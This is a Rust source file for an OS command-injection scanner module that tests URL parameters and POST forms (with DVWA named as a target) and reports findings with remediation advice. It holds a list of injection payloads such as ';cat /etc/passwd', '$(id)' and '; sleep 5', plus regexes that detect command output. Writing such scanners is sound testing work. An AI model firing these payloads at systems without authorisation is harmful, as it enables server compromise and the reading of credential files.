use async_trait::async_trait;
use regex::Regex;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};
use crate::scanners::traits::VulnerabilityScanner;
use crate::core::crawler::CrawledPage;
use crate::reporting::models::Vulnerability;
use crate::error::VenomResult;

pub struct CmdiScanner {
    payloads_path: PathBuf,
}

impl CmdiScanner {
    pub fn new(payloads_path: &Path) -> Self {
        Self { payloads_path: payloads_path.to_path_buf() }
    }

    fn load_payloads(&self) -> Vec<String> {
        if let Ok(content) = std::fs::read_to_string(&self.payloads_path) {
            content.lines().map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty() && !l.starts_with('#')).collect()
        } else {
            default_cmdi_payloads()
        }
    }
}

#[async_trait]
impl VulnerabilityScanner for CmdiScanner {
    fn name(&self) -> &str { "Command Injection Scanner" }
    fn description(&self) -> &str { "Tests for OS Command Injection vulnerabilities" }

    async fn scan(
        &self,
        pages: &[CrawledPage],
        client: &reqwest::Client,
    ) -> VenomResult<Vec<Vulnerability>> {
        let mut vulns = Vec::new();
        let payloads = self.load_payloads();
        let mut tested = std::collections::HashSet::new();

        let cmdi_indicators = vec![
            Regex::new(r"root:.*:0:0:").unwrap(),
            Regex::new(r"uid=\d+.*gid=\d+").unwrap(),
            Regex::new(r"Windows IP Configuration").unwrap(),
            Regex::new(r"Directory of [A-Z]:\\").unwrap(),
            Regex::new(r"total \d+\s+drwx").unwrap(),
            Regex::new(r"Linux version \d+").unwrap(),
            Regex::new(r"PING \d+\.\d+\.\d+\.\d+").unwrap(),
            Regex::new(r"bytes from .* icmp_seq").unwrap(),
            Regex::new(r"TTL=\d+").unwrap(),
            Regex::new(r"1 packets transmitted").unwrap(),
        ];

        for page in pages {
            let cookie = page.auth_cookie.clone();

            // Test URL params
            for (param_name, _) in &page.params {
                let test_key = format!("cmdi:{}:{}", page.url, param_name);
                if tested.contains(&test_key) { continue; }

                for payload in &payloads {
                    let test_url = inject_param(&page.url, param_name, payload);

                    let mut req = client.get(&test_url);
                    if let Some(ref c) = cookie { req = req.header("Cookie", c); }

                    if let Ok(resp) = req.send().await {
                        if let Ok(body) = resp.text().await {
                            for indicator in &cmdi_indicators {
                                if indicator.is_match(&body) {
                                    tested.insert(test_key.clone());
                                    vulns.push(create_cmdi_vuln(
                                        &page.url, param_name, payload,
                                        &format!("Command output detected with payload '{}': pattern matched '{}'", payload, indicator.as_str()),
                                    ));
                                    break;
                                }
                            }
                        }
                    }
                    if tested.contains(&test_key) { break; }
                }

                if tested.contains(&test_key) { continue; }

                // Time-based
                let time_payloads = vec![
                    ";sleep 5", "| sleep 5", "|| sleep 5", "`sleep 5`", "$(sleep 5)",
                ];
                for payload in &time_payloads {
                    let test_url = inject_param(&page.url, param_name, payload);
                    let start = Instant::now();

                    let mut req = client.get(&test_url);
                    if let Some(ref c) = cookie { req = req.header("Cookie", c); }

                    if let Ok(_) = req.send().await {
                        if start.elapsed() >= Duration::from_secs(4) {
                            tested.insert(test_key.clone());
                            vulns.push(create_cmdi_vuln(
                                &page.url, param_name, payload,
                                &format!("Time-based: payload '{}' delayed response {:.1}s", payload, start.elapsed().as_secs_f64()),
                            ));
                            break;
                        }
                    }
                }
            }

            // Test POST forms (important for DVWA /vulnerabilities/exec/)
            for form in &page.forms {
                if form.method != "POST" { continue; }

                for input in &form.inputs {
                    if input.input_type == "hidden" || input.input_type == "submit" { continue; }

                    let form_key = format!("cmdi:form:{}:{}", form.action, input.name);
                    if tested.contains(&form_key) { continue; }

                    for payload in &payloads {
                        let mut form_data = std::collections::HashMap::new();
                        for inp in &form.inputs {
                            if inp.name == input.name {
                                // For command injection, prepend a valid value
                                form_data.insert(inp.name.clone(), format!("127.0.0.1{}", payload));
                            } else {
                                form_data.insert(inp.name.clone(), inp.value.clone());
                            }
                        }

                        let mut req = client.post(&form.action).form(&form_data);
                        if let Some(ref c) = cookie { req = req.header("Cookie", c); }

                        if let Ok(resp) = req.send().await {
                            if let Ok(body) = resp.text().await {
                                for indicator in &cmdi_indicators {
                                    if indicator.is_match(&body) {
                                        tested.insert(form_key.clone());
                                        vulns.push(create_cmdi_vuln(
                                            &form.action, &input.name,
                                            &format!("127.0.0.1{}", payload),
                                            &format!("Command injection in POST form. Payload: '127.0.0.1{}'. Output matched: '{}'", payload, indicator.as_str()),
                                        ));
                                        break;
                                    }
                                }
                            }
                        }
                        if tested.contains(&form_key) { break; }
                    }
                }
            }
        }

        Ok(vulns)
    }
}

fn inject_param(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param { (k.to_string(), payload.to_string()) }
                else { (k.to_string(), v.to_string()) }
            }).collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in pairs { parsed.query_pairs_mut().append_pair(&k, &v); }
        parsed.to_string()
    } else { url.to_string() }
}

fn create_cmdi_vuln(url: &str, param: &str, payload: &str, evidence: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new("OS Command Injection", "Command Injection", "CRITICAL", url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "OS Command Injection detected in parameter '{}'. The payload '{}' caused the server \
         to execute system commands. User input is passed directly to shell commands.", param, payload
    );
    vuln.impact = "Full server compromise. An attacker can execute arbitrary OS commands, \
         read/write files, install backdoors, pivot to internal network.".to_string();
    vuln.remediation = "1. Avoid calling OS commands from application code\n\
         2. Use language-specific APIs instead of shell commands\n\
         3. If unavoidable, use strict allowlists for permitted inputs\n\
         4. Never concatenate user input into command strings\n\
         5. Use parameterized command execution".to_string();
    vuln.cwe_id = Some("CWE-78".to_string());
    vuln.references = vec![
        "https://owasp.org/www-community/attacks/Command_Injection".to_string(),
        "https://portswigger.net/web-security/os-command-injection".to_string(),
    ];
    vuln
}

fn default_cmdi_payloads() -> Vec<String> {
    vec![
        ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)",
        ";cat /etc/passwd", "|cat /etc/passwd", ";ls -la", "|ls -la",
        ";uname -a", "|uname -a", ";whoami", "|whoami",
        "\nid", "%0aid", ";sleep 5", "|sleep 5",
    ].iter().map(|s| s.to_string()).collect()
}